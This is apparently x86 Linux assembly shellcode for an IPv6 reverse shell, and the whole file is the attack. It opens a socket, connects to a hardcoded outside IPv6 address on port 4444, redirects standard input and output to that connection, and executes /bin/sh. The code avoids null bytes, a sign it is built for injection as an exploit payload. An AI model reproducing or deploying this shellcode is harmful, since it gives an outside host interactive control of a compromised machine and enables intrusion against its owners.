global _start

section .text

_start:
	; socketcall
	xor eax, eax
	mov al, 0x66
	xor ebx, ebx
	mov bl, 1

	xor ecx, ecx
	push ecx
	push ebx
	push 0xa
	mov ecx, esp
	int 0x80

	mov edi, eax

	;connect
	; IPv6: 2a02:b0c0:1:e0:0:0:6ae:2002
  xor eax, eax
	push 0x0220ae06 ;6ae:2002
  push eax ;0:0
	; 0001:00e0 -> e0000100
	mov bx, 0xe0e0
	mov bl, al ;al is 0x0
	push bx
  mov bx, 0x0101
	mov bl, al ;al is 0x0
	push bx
	push 0xc0b0022A ; 2a02:b0c0
	push eax ; sin6_flowinfo
	push word 0x5c11
	push word 0xa
	mov edx, esp
 
	mov al, 0x66
	xor ebx, ebx
	mov bl, 3
	push 0x1c
	push edx
	push edi
	mov ecx, esp

	int 0x80

	;dup2 for loop
	xor ecx, ecx
	mov cl, 2

duploop:
	mov al, 0x3f	
	int 0x80
	dec ecx
	jns duploop	

	;execve
	mov al, 0xb
	xor ecx, ecx
	push ecx
	push 0x68732f6e
	push 0x69622f2f
	mov ebx, esp
	cdq
	int 0x80
